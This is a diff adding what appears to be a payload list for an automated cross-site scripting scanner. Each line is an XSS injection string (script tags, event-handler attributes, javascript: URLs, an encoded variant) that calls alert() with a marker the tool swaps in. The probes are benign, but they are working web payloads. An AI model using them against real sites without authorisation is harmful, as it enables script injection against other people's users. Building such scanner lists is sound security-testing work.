@@ -1,0 +1,16 @@
+# XXTATIX will be replaced with a unique marker automatically
+<script>alert('XXTATIX')</script>
+"><script>alert('XXTATIX')</script>
+'><script>alert('XXTATIX')</script>
+"><img src=x onerror=alert('XXTATIX')>
+'><img src=x onerror=alert('XXTATIX')>
+<svg/onload=alert('XXTATIX')>
+<iframe src=javascript:alert('XXTATIX')>
+<details open ontoggle=alert('XXTATIX')>
+<body onload=alert('XXTATIX')>
+"><svg onload=alert('XXTATIX')>
+"><video src=x onerror=alert('XXTATIX')>
+"><a href="javascript:alert('XXTATIX')">click</a>
+"><input autofocus onfocus=alert('XXTATIX')>
+"><math><mtext></mtext><script>alert('XXTATIX')</script></math>
+%3Cscript%3Ealert('XXTATIX')%3C%2Fscript%3E
